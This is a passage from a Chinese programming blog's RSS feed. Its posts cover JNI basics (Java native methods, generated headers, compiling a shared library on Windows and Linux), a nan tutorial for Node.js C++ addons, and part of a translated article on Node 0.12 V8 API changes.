      <span class="n">jclass</span> <span class="n">exception</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">FindClass</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="s">&quot;java/lang/Exception&quot;</span><span class="p">);</span>
      <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ThrowNew</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="n">exception</span><span class="p">,</span><span class="s">&quot;This is a exception.&quot;</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</code></pre>
<p>这里ThrowNew转成java的话，就是<code>throw new Exception(&quot;This is a exception.&quot;);</code>其它的我就不多说了。</p>
]]></description><link>http://blog.whyun.com/posts/jni/2-struct-transform/</link><guid isPermaLink="true">http://blog.whyun.com/posts/jni/2-struct-transform/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Wed, 25 Nov 2015 00:00:00 GMT</pubDate></item><item><title><![CDATA[JNI系列教程一——入门]]></title><description><![CDATA[<h2><a name="1-1" class="anchor" href="#1-1"><span class="header-link"></span></a>1.1 背景</h2>
<p>和很多语言类似，java也提供了调用原生代码的功能，这门技术叫做JNI。有了JNI，可以在付出更小的代价的前提下，复用大量已经写好的C/C++库，当然一般用JNI的目的还是由于java在处理<strong>计算密集型</strong>（比如说非对称运算）的操作时有时会力不从心。<br>从结构上来看JNI是一个中间层，具体的调用步骤是这个样子的：java-&gt;JNI-&gt;C/C++。  </p>
<blockquote>
<p>本文源地址<a href="http://blog.whyun.com/posts/jni">http://blog.whyun.com/posts/jni</a> 转载请注明出处</p>
</blockquote>
<h2><a name="1-2" class="anchor" href="#1-2"><span class="header-link"></span></a>1.2 准备活动</h2>
<h3><a name="1-2-1-java" class="anchor" href="#1-2-1-java"><span class="header-link"></span></a>1.2.1 编写java代码</h3>
<pre><code class="lang-java"><div class="highlight"><pre><span class="kn">package</span> <span class="n">com</span><span class="o">.</span><span class="na">whyun</span><span class="o">.</span><span class="na">jni</span><span class="o">.</span><span class="na">chapter1</span><span class="o">;</span>

<span class="cm">/**</span>
<span class="cm"> * User: sunny</span>
<span class="cm"> * Date: 15-10-28</span>
<span class="cm"> * Time: 下午12:29</span>
<span class="cm"> */</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">FirstDemo</span> <span class="o">{</span>
    <span class="kd">static</span><span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">loadLibrary</span><span class="o">(</span><span class="s">&quot;firstdemo&quot;</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">native</span> <span class="kt">int</span> <span class="nf">getNum</span><span class="o">();</span>
    <span class="kd">public</span> <span class="kd">native</span> <span class="n">String</span> <span class="nf">getString</span><span class="o">();</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="o">[]</span><span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">FirstDemo</span> <span class="n">demo</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FirstDemo</span><span class="o">();</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;num:&quot;</span><span class="o">+</span><span class="n">demo</span><span class="o">.</span><span class="na">getNum</span><span class="o">()+</span><span class="s">&quot;,string:&quot;</span><span class="o">+</span><span class="n">demo</span><span class="o">.</span><span class="na">getString</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</code></pre>
<p><strong>代码 1.2.1.1</strong>
注意到我们在类<code>FirstDemo</code>中定义了两个成员函数都没有函数体，且都加了关键字<code>native</code>声明，如果函数写成这样，则代表当前函数需要调用底层C/C++代码。注意<code>System.loadLibrary</code>这句话，java中使用这个函数来加载动态库，windows平台下运行此段代码要保证<code>firstdemo.dll</code>存在环境变量<code>%path%</code>中，linux平台下要保证<code>libfirstdemo.so</code>存在环境变量<code>$LD_LIBRARY_PATH</code>中。</p>
<blockquote>
<p>其实java在<code>loadLibrary</code>的时候，是读取的系统变量<code>java.library.path</code>来搜寻动态库位置的，你可以用<code>System.getProperty(&quot;java.library.path&quot;)</code>来输出这个变量的内容。只不过在windows中会把环境变量<code>%path%</code>的内容加入到这个变量中，在linux中会把环境变量<code>$LD_LIBRARY_PATH</code>加入到这个变量中。在我的一台linux上打印<code>java.library.path</code>，会输入如下内容：
<code>/usr/jdk1.6.0_45/jre/lib/i386/server:/usr/jdk1.6.0_45/jre/lib/i386:
/usr/jdk1.6.0_45/jre/../lib/i386:
/home/username/lib::/usr/java/packages/lib/i386
:/lib:/usr/lib</code>
其中<code>/home/username/lib:</code>是从环境变量<code>$LD_LIBRARY_PATH</code>读取的。不推荐将生成的动态库放置到系统目录中，首先是不一定有管理员权限，其次会导致系统库目录下的文件过多，不易管理。</p>
</blockquote>
<h3><a name="1-2-2" class="anchor" href="#1-2-2"><span class="header-link"></span></a>1.2.2 生成头文件</h3>
<p>本文用到的项目源码在文后给出，项目的目录结构如下：<br><img src="http://blog.whyun.com/images/chapter1_dir.jpg" alt="项目目录结构"><br><strong>图1.2.2 项目目录结构</strong><br>其中目录<code>out/production</code>为我们的class文件生成的目录，在命令行下进入该目录，运行如下命令<code>javah com.whyun.jni.chapter1.FirstDemo</code>，运行成功之后则在运行命令行的目录下生成文件<code>com_whyun_jni_chapter1_FirstDemo.h</code>,用文本编辑器打开这个头文件，会显示如下内容：</p>
<pre><code class="lang-c"><div class="highlight"><pre><span class="cm">/* DO NOT EDIT THIS FILE - it is machine generated */</span>
<span class="cp">#include &lt;jni.h&gt;</span>
<span class="cm">/* Header for class com_whyun_jni_chapter1_FirstDemo */</span>

<span class="cp">#ifndef _Included_com_whyun_jni_chapter1_FirstDemo</span>
<span class="cp">#define _Included_com_whyun_jni_chapter1_FirstDemo</span>
<span class="cp">#ifdef __cplusplus</span>
<span class="k">extern</span> <span class="s">&quot;C&quot;</span> <span class="p">{</span>
<span class="cp">#endif</span>
<span class="cm">/*</span>
<span class="cm"> * Class:     com_whyun_jni_chapter1_FirstDemo</span>
<span class="cm"> * Method:    getNum</span>
<span class="cm"> * Signature: ()I</span>
<span class="cm"> */</span>
<span class="n">JNIEXPORT</span> <span class="n">jint</span> <span class="n">JNICALL</span> <span class="n">Java_com_whyun_jni_chapter1_FirstDemo_getNum</span>
  <span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="p">,</span> <span class="n">jobject</span><span class="p">);</span>

<span class="cm">/*</span>
<span class="cm"> * Class:     com_whyun_jni_chapter1_FirstDemo</span>
<span class="cm"> * Method:    getString</span>
<span class="cm"> * Signature: ()Ljava/lang/String;</span>
<span class="cm"> */</span>
<span class="n">JNIEXPORT</span> <span class="n">jstring</span> <span class="n">JNICALL</span> <span class="nf">Java_com_whyun_jni_chapter1_FirstDemo_getString</span>
  <span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="p">,</span> <span class="n">jobject</span><span class="p">);</span>

<span class="cp">#ifdef __cplusplus</span>
<span class="p">}</span>
<span class="cp">#endif</span>
<span class="cp">#endif</span>
</pre></div>
</code></pre>
<p><strong>代码 1.2.1</strong></p>
<h2><a name="1-3" class="anchor" href="#1-3"><span class="header-link"></span></a>1.3 编译运行</h2>
<p>为了简化在windows和linux下配置编译步骤，我们先在操作系统中配置两个环境变量，在windows上将<code>JAVA_HOME</code>配置为JDK的安装路径，很多情况下这个环境变量在配置JDK编译环境的时候已经配置过，可以通过<code>echo %JAVA_HOME%</code>的输出来判断之前是否已经配置过；同理我们在linux上也配置环境变量<code>JAVA_HOME</code>(通过运行<code>echo $JAVA_HOME</code>来检测是否存在)。同时我们在windows上将目录<code>d:\lib</code>加入环境变量<code>PATH</code>中，在linux上将<code>/opt/lib</code>加入环境变量<code>LD_LIBRARY_PATH</code>中。</p>
<h3><a name="1-3-1-windows" class="anchor" href="#1-3-1-windows"><span class="header-link"></span></a>1.3.1 windows编译环境配置</h3>
<p>windows下需要安装visual studio（简称vs）环境来完成C/C++编译，vs 有professional、ultimate和Express三个版本，前两者收费，我们使用免费的Express就够用了。我电脑上装的是vs express for desktop版本。<br>打开vs，新建项目，选择Visual C++，然后选择Empty Project，输入项目名<code>firstdemo</code>,点击确定。<br>接着设置项目属性，右击项目，然后选择properties，在Configuration Properties-&gt;General-&gt;Project Defaults-&gt;Configuration Type中，选择<code>Dynamic Library (.dll)</code>。然后在Configuration Properties-&gt;VC++ Directories-&gt;General-&gt;Include Directories中添加两个路径：<code>$(JAVA_HOME)\include</code>和<code>$(JAVA_HOME)\include\win32</code>。<br>最后编写c代码，在vs中新建源代码的时候，默认是cpp后缀，我们这里建一个c后缀的文件，因为我的编写习惯是c语法。</p>
<pre><code class="lang-c"><div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &quot;com_whyun_jni_chapter1_FirstDemo.h&quot;</span>

<span class="cm">/*</span>
<span class="cm"> * Class:     com_whyun_jni_chapter1_FirstDemo</span>
<span class="cm"> * Method:    getNum</span>
<span class="cm"> * Signature: ()I</span>
<span class="cm"> */</span>
<span class="n">JNIEXPORT</span> <span class="n">jint</span> <span class="n">JNICALL</span> <span class="nf">Java_com_whyun_jni_chapter1_FirstDemo_getNum</span>
  <span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">obj</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="p">(</span><span class="n">jint</span><span class="p">)</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*</span>
<span class="cm"> * Class:     com_whyun_jni_chapter1_FirstDemo</span>
<span class="cm"> * Method:    getString</span>
<span class="cm"> * Signature: ()Ljava/lang/String;</span>
<span class="cm"> */</span>
<span class="n">JNIEXPORT</span> <span class="n">jstring</span> <span class="n">JNICALL</span> <span class="nf">Java_com_whyun_jni_chapter1_FirstDemo_getString</span>
  <span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">ob</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">jstring</span> <span class="n">jinfo</span>            <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">NewStringUTF</span><span class="p">(</span><span class="n">env</span><span class="p">,</span><span class="s">&quot;the first demo.&quot;</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">jinfo</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</code></pre>
<p><strong>代码1.3.1 firstdemo.c</strong><br>注意我们引用了之前的<code>com_whyun_jni_chapter1_FirstDemo.h</code>，我们把它放到<code>firstdemo.c</code>同一级目录下了。<br>接着运行编译，产生dll文件，默认情况下会在项目目录Debug文件夹下产生firstdeom.dll，你可以把这个文件夹添加到环境变量PATH中去，也可以写脚本在编译完成之后将dll拷贝到电脑的任何一个PATH路径下，在Configuration Properties-&gt;Build Events-&gt;Post-Build Event-&gt;Command Line中写入如下命令：<code>copy &quot;$(TargetDir)$(TargetName).dll&quot; d:\lib\$(TargetName).dll</code>。</p>
<h3><a name="1-3-2-linux" class="anchor" href="#1-3-2-linux"><span class="header-link"></span></a>1.3.2 linux编译</h3>
<p>在linux下使用命令行GCC即可，将<code>com_whyun_jni_chapter1_FirstDemo.h</code>和<code>firstdemo.c</code>放到同一个目录下，然后运行脚本</p>
<pre><code><div class="highlight"><pre><span class="nx">saveDir</span><span class="o">=</span><span class="err">/opt/lib</span>
<span class="nx">gcc</span> <span class="o">-</span><span class="nx">g</span> <span class="o">-</span><span class="nx">Wall</span> <span class="o">-</span><span class="nx">I</span> <span class="nx">$JAVA_HOME</span><span class="o">/</span><span class="nx">include</span><span class="o">/</span> <span class="o">-</span><span class="nx">I</span> <span class="nx">$JAVA_HOME</span><span class="o">/</span><span class="nx">include</span><span class="o">/</span><span class="nx">linux</span> <span class="o">-</span><span class="nx">fPIC</span> <span class="o">-</span><span class="nx">shared</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">$saveDir</span><span class="o">/</span><span class="nx">libfirstdemo</span><span class="p">.</span><span class="nx">so</span> <span class="nx">firstdemo</span><span class="p">.</span><span class="nx">c</span>
</pre></div>
</code></pre>
<h3><a name="1-3-3" class="anchor" href="#1-3-3"><span class="header-link"></span></a>1.3.3 运行</h3>
<p>运行java代码，最终输出</p>
<pre><code><div class="highlight"><pre><span class="nx">num</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="nx">string</span><span class="o">:</span><span class="nx">the</span> <span class="nx">first</span> <span class="nx">demo</span><span class="p">.</span>
</pre></div>
</code></pre>
<blockquote>
<p>本文用到的源代码可以从<a href="http://git.oschina.net/yunnysunny/jni">http://git.oschina.net/yunnysunny/jni</a> 获得到</p>
</blockquote>
]]></description><link>http://blog.whyun.com/posts/jni/</link><guid isPermaLink="true">http://blog.whyun.com/posts/jni/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Sun, 01 Nov 2015 00:00:00 GMT</pubDate></item><item><title><![CDATA[nan入门教程]]></title><description><![CDATA[<p>Node.js在升级到0.12后，c++ API部分发生了翻天覆地的变化，如果你之前的代码是按照0.10的API编写的，将其改成0.12的形式是需要耗费一番精力的，但是问题又来了，你如果改为0.12形式，0.10又不能够被兼容了。幸好有<a href="https://github.com/nodejs/nan">nan</a>，其实它的核心是一个头文件，通过宏定义来做不同版本的node的c++ API的兼容。</p>
<h2><a name="1" class="anchor" href="#1"><span class="header-link"></span></a>1.配置</h2>
<p>首先你得在<code>package.json</code>中引入<code>nan</code>,然后在binding.gyp中配置：</p>
<pre><code><div class="highlight"><pre><span class="s2">&quot;include_dirs&quot;</span> <span class="o">:</span> <span class="p">[</span>
    <span class="s2">&quot;&lt;!(node -e \&quot;require(&#39;nan&#39;)\&quot;)&quot;</span>
<span class="p">]</span>
</pre></div>
</code></pre>
<p> 最后在使用<code>nan</code>的c++文件中引入头文件<code>#include&lt;nan.h&gt;</code>。</p>
<h2><a name="2-demo" class="anchor" href="#2-demo"><span class="header-link"></span></a>2.demo</h2>
<p> 下面的demo摘自nan的readme文档</p>
<pre><code><div class="highlight"><pre> <span class="c1">// addon.cc</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">node</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">nan</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="c1">// ..引入async.h或者sync.h</span>

<span class="nx">using</span> <span class="nx">v8</span><span class="o">::</span><span class="nx">FunctionTemplate</span><span class="p">;</span>
<span class="nx">using</span> <span class="nx">v8</span><span class="o">::</span><span class="nx">Handle</span><span class="p">;</span>
<span class="nx">using</span> <span class="nx">v8</span><span class="o">::</span><span class="nb">Object</span><span class="p">;</span>
<span class="nx">using</span> <span class="nx">v8</span><span class="o">::</span><span class="nb">String</span><span class="p">;</span>

<span class="k">void</span> <span class="nx">InitAll</span><span class="p">(</span><span class="nx">Handle</span><span class="o">&lt;</span><span class="nb">Object</span><span class="o">&gt;</span> <span class="nx">exports</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">exports</span><span class="o">-&gt;</span><span class="nx">Set</span><span class="p">(</span><span class="nx">NanNew</span><span class="o">&lt;</span><span class="nb">String</span><span class="o">&gt;</span><span class="p">(</span><span class="s2">&quot;calculateSync&quot;</span><span class="p">),</span>
    <span class="nx">NanNew</span><span class="o">&lt;</span><span class="nx">FunctionTemplate</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">CalculateSync</span><span class="p">)</span><span class="o">-&gt;</span><span class="nx">GetFunction</span><span class="p">());</span>

  <span class="nx">exports</span><span class="o">-&gt;</span><span class="nx">Set</span><span class="p">(</span><span class="nx">NanNew</span><span class="o">&lt;</span><span class="nb">String</span><span class="o">&gt;</span><span class="p">(</span><span class="s2">&quot;calculateAsync&quot;</span><span class="p">),</span>
    <span class="nx">NanNew</span><span class="o">&lt;</span><span class="nx">FunctionTemplate</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">CalculateAsync</span><span class="p">)</span><span class="o">-&gt;</span><span class="nx">GetFunction</span><span class="p">());</span>
<span class="p">}</span>

<span class="nx">NODE_MODULE</span><span class="p">(</span><span class="nx">addon</span><span class="p">,</span> <span class="nx">InitAll</span><span class="p">)</span>   
</pre></div>
</code></pre>
<p><strong>代码2.1 addon.cc</strong></p>
<p>首先就是导出函数部分，<code>nan</code>中写法为<code>exports-&gt;Set(NanNew&lt;String&gt;(&quot;calculateSync&quot;),
        NanNew&lt;FunctionTemplate&gt;(CalculateSync)-&gt;GetFunction());</code>，对于c++ api来说，在nan中全部都要用<code>NanNew</code>来声明，在0.10中这句话被写作<code>exports-&gt;Set(String::NewSymbol(&quot;calculateSync&quot;),FunctionTemplate::New(CalculateAsync)-&gt;GetFunction());</code>在0.12中是<code>NODE_SET_METHOD(exports, &quot;calculateSync&quot;, CalculateAsync);</code>。
 正常情况下需要引入函数<code>CalculateAsync</code>所在的头文件的，但是官方文档给出了两个<code>CalculateAsync</code>函数的实现，一个同步版，一个异步版。同步版仅仅是直接调用：</p>
<pre><code><div class="highlight"><pre><span class="c1">// sync.h</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">node</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">nan</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>

<span class="nx">NAN_METHOD</span><span class="p">(</span><span class="nx">CalculateSync</span><span class="p">);</span>
</pre></div>
</code></pre>
<p><strong>代码2.2 sync.h</strong></p>
<p>通过头文件就可以看出，函数声明的方式需要使用<code>NAN_METHOD(CalculateSync)</code>，这等同于0.10中的<code>Handle&lt;Value&gt; CalculateSync(const Arguments&amp; args)</code>,在0.12中要这么写<code>void CalculateSync(const FunctionCallbackInfo&lt;Value&gt;&amp; args)</code>。</p>
<pre><code><div class="highlight"><pre><span class="c1">// sync.cc</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">node</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">nan</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="s2">&quot;./sync.h&quot;</span>
<span class="c1">// ...引入第三方类库头文件</span>

<span class="nx">using</span> <span class="nx">v8</span><span class="o">::</span><span class="nb">Number</span><span class="p">;</span>

<span class="c1">// Simple synchronous access to the `Estimate()` function</span>
<span class="nx">NAN_METHOD</span><span class="p">(</span><span class="nx">CalculateSync</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">NanScope</span><span class="p">();</span>

  <span class="c1">// expect a number as the first argument</span>
  <span class="kr">int</span> <span class="nx">points</span> <span class="o">=</span> <span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="nx">Uint32Value</span><span class="p">();</span>
  <span class="kr">double</span> <span class="nx">est</span> <span class="o">=</span> <span class="nx">Estimate</span><span class="p">(</span><span class="nx">points</span><span class="p">);</span><span class="c1">//Estimate是一个第三方类库的函数，这里可以不用理会</span>

  <span class="nx">NanReturnValue</span><span class="p">(</span><span class="nx">NanNew</span><span class="o">&lt;</span><span class="nb">Number</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">est</span><span class="p">));</span>
<span class="p">}</span>
</pre></div>
</code></pre>
<p><strong>代码2.3 sync.cc</strong>
首先是函数<code>NanScope();</code>,他来完成node0.10中的<code>HandleScope scope;</code>的功能，在node0.12中是：</p>
<pre><code><div class="highlight"><pre><span class="nx">Isolate</span><span class="o">*</span> <span class="nx">isolate</span> <span class="o">=</span> <span class="nx">Isolate</span><span class="o">::</span><span class="nx">GetCurrent</span><span class="p">();</span>
<span class="nx">HandleScope</span> <span class="nx">scope</span><span class="p">(</span><span class="nx">isolate</span><span class="p">);</span>
</pre></div>
</code></pre>
<p>函数结束返回值操作也变成由函数（确切的说应该是宏定义）NanReturnValue来代替。</p>
<p>更令人振奋的是，nan中还对libuv中的函数<code>uv_queue_work</code>进行了抽象，可以通过继承类<code>NanAsyncWorker</code>来实现异步话操作，省去了为了使用<code>uv_queue_work</code>而自定义数据结构的步骤。下面就是async.cc的代码：</p>
<pre><code><div class="highlight"><pre><span class="c1">// async.cc</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">node</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="o">&lt;</span><span class="nx">nan</span><span class="p">.</span><span class="nx">h</span><span class="o">&gt;</span>
<span class="err">#</span><span class="nx">include</span> <span class="s2">&quot;./async.h&quot;</span>

<span class="c1">// ...引入第三方类库</span>

<span class="nx">using</span> <span class="nx">v8</span><span class="o">::</span><span class="nb">Function</span><span class="p">;</span>
<span class="nx">using</span> <span class="nx">v8</span><span class="o">::</span><span class="nx">Local</span><span class="p">;</span>
<span class="nx">using</span> <span class="nx">v8</span><span class="o">::</span><span class="nx">Null</span><span class="p">;</span>
<span class="nx">using</span> <span class="nx">v8</span><span class="o">::</span><span class="nb">Number</span><span class="p">;</span>
<span class="nx">using</span> <span class="nx">v8</span><span class="o">::</span><span class="nx">Value</span><span class="p">;</span>

<span class="kr">class</span> <span class="nx">PiWorker</span> <span class="o">:</span> <span class="kr">public</span> <span class="nx">NanAsyncWorker</span> <span class="p">{</span>
 <span class="kr">public</span><span class="o">:</span>
  <span class="nx">PiWorker</span><span class="p">(</span><span class="nx">NanCallback</span> <span class="o">*</span><span class="nx">callback</span><span class="p">,</span> <span class="kr">int</span> <span class="nx">points</span><span class="p">)</span>
    <span class="o">:</span> <span class="nx">NanAsyncWorker</span><span class="p">(</span><span class="nx">callback</span><span class="p">),</span> <span class="nx">points</span><span class="p">(</span><span class="nx">points</span><span class="p">)</span> <span class="p">{}</span>
  <span class="o">~</span><span class="nx">PiWorker</span><span class="p">()</span> <span class="p">{}</span>

  <span class="c1">//这个函数运行在工作线程，而不是v8线程，所以不能访问v8的数据</span>
  <span class="k">void</span> <span class="nx">Execute</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nx">estimate</span> <span class="o">=</span> <span class="nx">Estimate</span><span class="p">(</span><span class="nx">points</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">//这个是libuv的回调函数，在这里可以使用v8的数据</span>
  <span class="k">void</span> <span class="nx">HandleOKCallback</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nx">NanScope</span><span class="p">();</span>

    <span class="nx">Local</span><span class="o">&lt;</span><span class="nx">Value</span><span class="o">&gt;</span> <span class="nx">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
        <span class="nx">NanNull</span><span class="p">()</span>
      <span class="p">,</span> <span class="nx">NanNew</span><span class="o">&lt;</span><span class="nb">Number</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">estimate</span><span class="p">)</span>
    <span class="p">};</span>

    <span class="nx">callback</span><span class="o">-&gt;</span><span class="nx">Call</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nx">argv</span><span class="p">);</span>
  <span class="p">};</span>

 <span class="kr">private</span><span class="o">:</span>
  <span class="kr">int</span> <span class="nx">points</span><span class="p">;</span>
  <span class="kr">double</span> <span class="nx">estimate</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// Asynchronous access to the `Estimate()` function</span>
<span class="nx">NAN_METHOD</span><span class="p">(</span><span class="nx">CalculateAsync</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">NanScope</span><span class="p">();</span>

  <span class="kr">int</span> <span class="nx">points</span> <span class="o">=</span> <span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="nx">Uint32Value</span><span class="p">();</span>
  <span class="nx">NanCallback</span> <span class="o">*</span><span class="nx">callback</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NanCallback</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">As</span><span class="o">&lt;</span><span class="nb">Function</span><span class="o">&gt;</span><span class="p">());</span>

  <span class="nx">NanAsyncQueueWorker</span><span class="p">(</span><span class="k">new</span> <span class="nx">PiWorker</span><span class="p">(</span><span class="nx">callback</span><span class="p">,</span> <span class="nx">points</span><span class="p">));</span>
  <span class="nx">NanReturnUndefined</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>
</code></pre>
<p><strong>代码2.4 async.cc</strong><br><a href="http://git.oschina.net/yunnysunny/async-tutorial-code/tree/master/addon">这里</a>有一个利用<a href="https://github.com/nodejs/nan">nan</a>和node0.10/0.12来完成异步操作的对比。</p>
<p>这篇教程仅仅是一个入门操作，就讲到这里了，详细的使用请参考nan的readme文档。</p>
]]></description><link>http://blog.whyun.com/posts/nan/</link><guid isPermaLink="true">http://blog.whyun.com/posts/nan/</guid><dc:creator><![CDATA[白一梓]]></dc:creator><pubDate>Sun, 24 May 2015 00:00:00 GMT</pubDate></item><item><title><![CDATA[即将面临的Node0.12中的C++API的改变]]></title><description><![CDATA[<p>原文地址：<a href="https://strongloop.com/strongblog/node-js-v0-12-c-apis-breaking/">https://strongloop.com/strongblog/node-js-v0-12-c-apis-breaking/</a></p>
<blockquote>
<p>编者注：欢迎阅读旨在帮你快速了解，在即将发布的node0.12中（ <em>作者写这篇文章的时候Node0.12还没有发布，译者注</em> ）的API变化三系列教程的第三部分。在<a href="http://strongloop.com/strongblog/node-js-v0-12-new-apis/">第一部分</a>，<a href="https://github.com/alexgorbatchev">Alex Gorbatchev</a>列出来没有变化的API，在<a href="http://strongloop.com/strongblog/node-js-v0-12-apis-breaking/">第二部分</a>中他指出了变化的部分。在第三部分，<a href="http://strongloop.com/strongblog/node-js-v0-12-apis-breaking/">Ben Noordhuis</a>将会详细描述C++API部分的差别。  </p>
</blockquote>
<p>在Node v0.10和v0.12之间有大量的差异。我不会试图把每一个细节都点出来，我将把这些差异分类，按照从“更重要”到“次重要”的次序进行排序，然后解释怎样合理的更新你的代码。<br>本文大部分讲述V8 API，因为这正是大量差异出现的地方。欢迎通过<a href="mailto:ben@strongloop.com">ben at strongloop.com</a>来给我提供建议和反馈。  </p>
<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>原生函数的参数已经被更改</h2>
<p>在node v0.10中你这么写： </p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="n">v8</span><span class="o">::</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span><span class="n">FortyTwo</span><span class="p">(</span><span class="k">const</span> <span class="n">v8</span><span class="o">::</span><span class="n">Arguments</span><span class="o">&amp;</span><span class="n">args</span><span class="p">){</span>
      <span class="n">v8</span><span class="o">::</span><span class="n">HandleScope</span> <span class="n">handle_scope</span><span class="p">;</span>
      <span class="n">returnhandle_scope</span><span class="p">.</span><span class="n">Close</span><span class="p">(</span><span class="n">v8</span><span class="o">::</span><span class="n">Integer</span><span class="o">::</span><span class="n">New</span><span class="p">(</span><span class="mi">42</span><span class="p">));</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<p>在node v0.12中你这么写：</p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="kt">void</span> <span class="nf">FortyTwo</span><span class="p">(</span><span class="k">const</span> <span class="n">v8</span><span class="o">::</span><span class="n">FunctionCallbackInfo</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;&amp;</span><span class="n">info</span><span class="p">){</span>
      <span class="c1">// Don&#39;t need a HandleScope in this particular example.</span>
      <span class="n">info</span><span class="p">.</span><span class="n">GetReturnValue</span><span class="p">().</span><span class="n">Set</span><span class="p">(</span><span class="mi">42</span><span class="p">);</span>
    <span class="p">}</span>
</pre></div>
</code></pre>
<p>一些重要的变化如下:  </p>
<ol>
<li>返回类型是<code>void</code>。</li>
<li>返回值通过<code>v8::ReturnValue::Set()</code>,<code>v8::ReturnValue::SetEmptyString()</code>,<code>v8::ReturnValue::SetNull()</code>,<code>v8::ReturnValue::SetUndefined()</code>来设置。</li>
<li>如果没有显式的设置返回值，将会返回<code>undefined</code>。</li>
</ol>
<p><code>v8::ReturnValue::Set()</code>拥有一个数字类型的重载函数可以是使用不同的数据类型。如果你的编译器处理时出现问题或者报歧义错误，那么就是使用<code>static_cast&lt;&gt;</code>来将参数转为支持的类型：  </p>
<pre><code class="lang-c++"><div class="highlight"><pre>    <span class="kt">void</span> <span class="nf">FortyTwo</span><span class="p">(</span><span class="k">const</span> <span class="n">v8</span><span class="o">::</span><span class="n">FunctionCallbackInfo</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;&amp;</span> <span class="n">info</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">const</span> <span class="kt">int64_t</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
      <span class="c1">// error: call of overloaded &#39;Set(const int64_t&amp;)&#39; is ambiguous</span>
      <span class="n">info</span><span class="p">.</span><span class="n">GetReturnValue</span><span class="p">().</span><span class="n">Set</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
